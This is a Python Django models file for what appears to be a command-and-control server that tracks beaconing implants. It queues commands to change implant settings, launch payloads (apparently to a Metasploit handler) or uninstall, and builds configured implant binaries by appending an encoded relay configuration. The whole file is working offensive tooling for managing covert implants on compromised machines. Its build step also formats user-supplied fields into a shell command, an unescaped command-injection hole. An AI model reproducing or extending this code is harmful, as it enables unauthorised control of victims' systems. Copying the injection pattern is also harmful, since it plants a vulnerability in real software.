import datetime
import logging
import os
import shutil

from django.conf import settings
from django.utils.timezone import now
from django.core.validators import MaxValueValidator
from django.core.exceptions import ValidationError
from django.db import models
import envoy
from model_utils.fields import MonitorField
from model_utils.models import TimeStampedModel
from model_utils import Choices, FieldTracker
from uuidfield import UUIDField

from .helpers import unique_slugify


logger = logging.getLogger(__name__)


class ConfigurationCreationError(Exception): pass


class Group(models.Model):
	label = models.CharField(max_length=255)
	slug = models.SlugField()

	def __unicode__(self):
		return self.label

	def save(self, *args, **kwargs):
		unique_slugify(self, self.label)
		return super(Group, self).save(*args, **kwargs)


class Implant(models.Model):
	# Basic Info
	uuid = models.CharField(max_length=36)
	group = models.ForeignKey(Group)
	label = models.CharField(max_length=255)
	ip_address = models.GenericIPAddressField(unpack_ipv4=True, blank=True, null=True)
	operating_system = models.CharField(max_length=255, blank=True)
	last_beacon = models.DateTimeField(blank=True, null=True)

	# Settings
	beacon_interval = models.PositiveIntegerField()
	beacon_jitter = models.PositiveIntegerField()
	relay_host = models.CharField(max_length=255, verbose_name="Beacon URL")
	relay_port = models.PositiveIntegerField(validators=[MaxValueValidator(65535, message='Port numbers must be 0-65535')])

	# TODO: Convert this to an actual state machine. There should never be a case where an implant is both interactive *and* uninstalled.
	interactive = models.BooleanField(default=False)
	uninstalled = models.BooleanField(default=False)

	tracker = FieldTracker()

	def __unicode__(self):
		return '{label} ({group}) - {ip_address}'.format(label=self.label, group=self.group.label, ip_address=self.ip_address)

	def save(self, create_change_setting_commands=True, *args, **kwargs):
		super(Implant, self).save(*args, **kwargs)

		if not create_change_setting_commands:
			return

		if self.tracker.has_changed('beacon_interval'):
			self.change_setting('beacon_interval', self.beacon_interval)

		if self.tracker.has_changed('beacon_jitter'):
			self.change_setting('beacon_jitter', self.beacon_jitter)

		if self.tracker.has_changed('relay_host'):
			self.change_setting('relay_host', self.relay_host)

		if self.tracker.has_changed('relay_port'):
			self.change_setting('relay_port', self.relay_port)

	@property
	def expected_next_beacon(self):
	    # For now we just ignore the jitter
	    return self.last_beacon + datetime.timedelta(minutes=self.beacon_interval)
	
	@property
	def is_late(self):
		if now() > self.expected_next_beacon + datetime.timedelta(minutes=self.beacon_jitter) + datetime.timedelta(minutes=settings.LATE_MINUTES):
			return True
		else:
			return False

	@property
	def status(self):
		if self.interactive:
			return "Interactive"
		elif self.uninstalled:
			return "Uninstalled"
		elif self.is_late:
			return "Late"
		else:
			return "Healthy"

	@property
	def status_class(self):
		# Yes, this is template-related stuff in the model.
		if self.status == "Interactive":
			return "success"
		elif self.status == "Late":
			return "danger"
		elif self.status == "Uninstalled":
			return "warning"
		else:
			return ""

	def beacon(self):
		# TODO: Update fields if applicable

		self.last_beacon = now()
		self.save()

		# Gather up a list of commands
		commands = list()
		for command in self.command_set.filter(status=Command.STATUS.created):
			command.mark_sent()

			command_dict = {
				'id': unicode(command.uuid),
				'command': command.get_command_type_display(),
				'argument': command.argument
			}

			commands.append(command_dict)
		return commands

	def change_setting(self, setting_name, setting_value):
		"""
		Create a "change setting" command.
		"""
		# TODO: Escape the '=' instead of blowing up
		if type(setting_name) in (str, unicode) and '=' in setting_name:
			raise ValueError('Setting name may not contain \'=\'')
		if type(setting_value) in (str, unicode) and '=' in setting_value:
			raise ValueError('Setting value may not contain \'=\'')

		logger.info('Creating change setting command for {name}={value} for {implant}'.format(name=setting_name, value=setting_value, implant=self))	
		argument = '{name}={value}'.format(name=setting_name, value=setting_value)
		command = Command.objects.create(implant=self, command_type=Command.COMMAND_TYPES.change_setting, argument=argument)
		return command

	def launch_payload(self, payload_url):
		"""
		Create a "launch payload" command. This will generally point to a metasploit multi/handler.
		"""

		self.interactive = True
		self.save(create_change_setting_commands=False)

		logger.info('Creating launch payload command with URL {payload_url} for {implant}'.format(payload_url=payload_url, implant=self))
		command = Command.objects.create(implant=self, command_type=Command.COMMAND_TYPES.launch_payload, argument=payload_url)
		return command

	def end_interactive_session(self):
		self.interactive = False
		self.save(create_change_setting_commands=False)
		logger.info('Ended interactive session for {implant}'.format(implant=self))		

	def uninstall(self):
		"""
		Create an "uninstall" command for this implant
		"""
		self.uninstalled = True
		self.interactive = False
		self.save(create_change_setting_commands=False)

		# TODO: Invalidate all pending commands?

		logger.info('Creating uninstall command for {implant}'.format(implant=self))
		command = Command.objects.create(implant=self, command_type=Command.COMMAND_TYPES.uninstall)
		return command


class Command(TimeStampedModel):
	STATUS = Choices(
		(0, 'created', 'Created'),
		(1, 'sent', 'Sent'),
		(2, 'completed', 'Completed'),
		(3, 'error', 'Error'),
	)
	COMMAND_TYPES = Choices(
		(0, 'change_setting', 'Change Setting'),
		(1, 'launch_payload', 'Launch Payload'),
		(2, 'uninstall', 'Uninstall'),
	)

	implant = models.ForeignKey(Implant)
	uuid = UUIDField(auto=True)
	status = models.IntegerField(choices=STATUS, default=STATUS.created)
	sent_at = MonitorField(monitor='status', when=[STATUS.sent], blank=True, null=True)
	resolved_at = MonitorField(monitor='status', when=[STATUS.completed, STATUS.error], blank=True, null=True)

	command_type = models.IntegerField(choices=COMMAND_TYPES)
	argument = models.TextField(blank=True)

	def __unicode__(self):
		return '{command} for {implant}'.format(command=self.get_command_type_display(), implant=self.implant)

	def mark_sent(self):
		logger.info('Command {uuid} ({implant} - {type}) marked as sent'.format(uuid=self.uuid, implant=self.implant, type=self.get_command_type_display()))
		self.status = self.STATUS.sent
		self.save()

	def resolve(self, error=False):
		if error:
			self.status = self.STATUS.error
			logger.info('Command {uuid} ({implant} - {type}) marked as error'.format(uuid=self.uuid, implant=self.implant, type=self.get_command_type_display()))
		else:
			self.status = self.STATUS.completed
			logger.info('Command {uuid} ({implant} - {type}) marked as completed'.format(uuid=self.uuid, implant=self.implant, type=self.get_command_type_display()))
		self.save()


def generate_binary_types():
	binaries = []
	for key, item in settings.PULSAR_BINARIES.iteritems():
		label = item['label']
		binaries.append((key, label))
	return tuple(binaries)


def validate_beacon_url(value):
	if value[-1] != '/':
		raise ValidationError('"%s" does not end in a forward slash ("/")' % value)


class ProvisionedBinary(TimeStampedModel):
	label = models.CharField(max_length=255)
	uuid = UUIDField(auto=True)
	binary_type = models.CharField(max_length=255, choices=generate_binary_types(), default=generate_binary_types()[0])

	beacon_time = models.PositiveIntegerField()
	beacon_jitter = models.PositiveIntegerField()
	local_port = models.PositiveIntegerField(validators=[MaxValueValidator(65535, message='Port numbers must be 0-65535')], default=settings.HANDLER_PORT)
	relay_url = models.CharField(max_length=255, verbose_name="Beacon URL", validators=[validate_beacon_url])
	group = models.ForeignKey(Group)

	configuration = models.FileField(blank=True, null=True, editable=False, upload_to='configurations')
	binary_file = models.FileField(blank=True, null=True, editable=False, upload_to='binaries')

	class Meta:
		verbose_name_plural = 'Provisioned binaries'

	def __unicode__(self):
		return '{label} ({uuid})'.format(label=self.label, uuid=self.uuid)

	def save(self, *args, **kwargs):
		ret = super(ProvisionedBinary, self).save(*args, **kwargs)
		if self.configuration.name is None and self.binary_file.name is None:
			self.build()
		return ret

	def delete(self, *args, **kwargs):
		if self.configuration is not None:
			self.configuration.delete()
		if self.binary_file is not None:
			self.binary_file.delete()
		return super(ProvisionedBinary, self).delete(*args, **kwargs)

	@property
	def source_binary_path(self):
		return unicode(settings.PULSAR_BINARIES[self.binary_type]['path'])

	@property
	def destination_binary_path(self):
		return 'binaries/{uuid}.{extension}'.format(uuid=self.uuid, extension=settings.PULSAR_BINARIES[self.binary_type]['extension'])

	@property
	def absolute_destination_binary_path(self):
		return os.path.join(settings.MEDIA_ROOT, self.destination_binary_path)

	def build(self, commit=True):
		# Make sure these media directories exist. They sometimes get lost during deployment.
		configuration_dir = os.path.join(settings.MEDIA_ROOT, 'configurations')
		if not os.path.isdir(configuration_dir):
			os.makedirs(configuration_dir)
		configured_binaries_dir = os.path.join(settings.MEDIA_ROOT, 'binaries')
		if not os.path.isdir(configured_binaries_dir):
			os.makedirs(configured_binaries_dir)

		configuration_file = 'configurations/{uuid}.var'.format(uuid=self.uuid)
		configuration_file_absolute = os.path.join(settings.MEDIA_ROOT, configuration_file)
		r = envoy.run('{VarEncode} -b {beacon_time} -j {beacon_jitter} -p {local_port} -r "{relay_url}" -g "{group}" -o "{configuration_file}"'.format(
			VarEncode=settings.VARENCODE,
			beacon_time=self.beacon_time,
			beacon_jitter=self.beacon_jitter,
			local_port=self.local_port,
			relay_url=self.relay_url,
			group=self.group.slug,
			configuration_file=configuration_file_absolute,
		))
		if r.status_code != 0:
			error_message = 'Failed to create configuration: status_code={status_code} std_out="{std_out}" std_err="{std_err}"'.format(
				status_code=r.status_code,
				std_out=r.std_out,
				std_err=r.std_err,
			)
			print error_message
			logger.error(error_message)
			raise ConfigurationCreationError('Unable to create configuration. Please check your parameters and Django settings and try again.')

		self.configuration = configuration_file
		
		with open(self.absolute_destination_binary_path, 'wb') as dst:
			with open(self.source_binary_path, 'rb') as src:
				shutil.copyfileobj(src, dst)
			with open(configuration_file_absolute, 'rb') as src:
				shutil.copyfileobj(src, dst)
		self.binary_file = self.destination_binary_path

		self.save()
